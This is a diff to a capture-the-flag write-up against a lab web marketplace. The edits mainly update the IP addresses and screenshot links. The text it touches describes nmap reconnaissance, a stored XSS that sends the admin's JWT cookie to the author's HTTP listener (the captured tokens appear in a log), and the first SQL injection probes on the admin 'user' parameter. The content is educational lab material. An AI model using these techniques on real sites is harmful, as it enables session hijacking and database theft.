@@ -3,7 +3,7 @@
 
 Let's start with nmap scan:
 ```bash
-nmap -sV -sC 10.10.3.15 | tee nmap/start
+nmap -sV -sC 10.10.243.219 | tee nmap/start
 ```
 
 The results:
@@ -33,7 +33,8 @@ In the scan it also found that in the robots.txt directory there is an "/admin" 
 
 It's forbidden:
 
-![image](https://user-images.githubusercontent.com/114166939/232095591-266d7b01-2bd2-40a0-a63f-16d0f62c2655.png)
+![image](https://user-images.githubusercontent.com/114166939/232224360-2a9fe600-df3f-4528-94c9-cb36032fcfc6.png)
+
 
 I'll sign up with a test account:
 
@@ -71,7 +72,7 @@ So the server probably identify the users by "userId" and "username" parameters.
 
 This information will be important in the near future!
 
-Let's move on to the New listing ("http://10.10.171.31/new") page:
+Let's move on to the New listing ("http://10.10.243.219/new") page:
 
 ![image](https://user-images.githubusercontent.com/114166939/232100022-ae881109-485a-4a4f-8020-d827fb8569c4.png)
 
@@ -90,7 +91,7 @@ Let's try in the description input:
 
 It works!
 
-![image](https://user-images.githubusercontent.com/114166939/232101158-1cf33e18-0bbb-4ecc-bc20-45d2601fb543.png)
+![image](https://user-images.githubusercontent.com/114166939/232224429-f9fe1f0b-75dc-40fc-89b3-f7148081f11f.png)
 
 Also when I'm going to the home page and clicking on this listing the alert pops out.
 It is a reflected and stored xss!
@@ -129,7 +130,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 10.14.50.11 - - [14/Apr/2023 13:20:31] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjgxNDg4MzMyfQ.LOu-eEsb_vaK-pZ8xZjVHvaVNuFRjRzyq3yAps2tAnY HTTP/1.1" 200 -
 
-10.10.171.31 - - [14/Apr/2023 13:21:26] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2ODE0OTI4ODd9.YI1C9_Iu632z1-0xDX1jm0DUeFwiGgqiDR1joEGcKzw HTTP/1.1" 200 -
+10.10.243.219 - - [14/Apr/2023 13:21:26] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2ODE0OTI4ODd9.YI1C9_Iu632z1-0xDX1jm0DUeFwiGgqiDR1joEGcKzw HTTP/1.1" 200 -
 ```
 
 The first one is my current user cookie, the same one as I checked in my cookie manager extension.
@@ -160,13 +161,13 @@ Got the first flag:
 
 Now let's click on the system user:
 
-![image](https://user-images.githubusercontent.com/114166939/232117026-e9513b4c-5bad-4362-85f8-a80c7f2c56c1.png)
+![image](https://user-images.githubusercontent.com/114166939/232224601-1d468d6d-be9f-4319-863a-329525949f36.png)
 
-This page use GET method and maybe vulnerable to sqli in the "user" parameter - "http://10.10.171.31/admin?user=1".
+This page use GET method and maybe vulnerable to sqli in the "user" parameter - "http://10.10.243.219/admin?user=1".
 
 The easiest way to test the url is to add ' and check its response:
 ```url
-http://10.10.171.31/admin?user=1'
+http://10.10.243.219/admin?user=1'
 ```
 
 ![image](https://user-images.githubusercontent.com/114166939/232117835-abc95af0-4082-4703-929a-afa263519e99.png)
@@ -175,7 +176,21 @@ It's probably vulnerable, also it written that this website use MySQL server!
 
 Let's try find out how much columns are in the tables of this DataBase with SQL injection to the url:
 ```url
-http://10.10.171.31/admin?user=1 order by 1-- -
+http://10.10.243.219/admin?user=1 order by 1-- -
 ```
 
 It responded the same, than I'll increase the column numbers until the website will response differently:
+
+```
+
+```
+
+
+
+
+
+
+
+
+
+
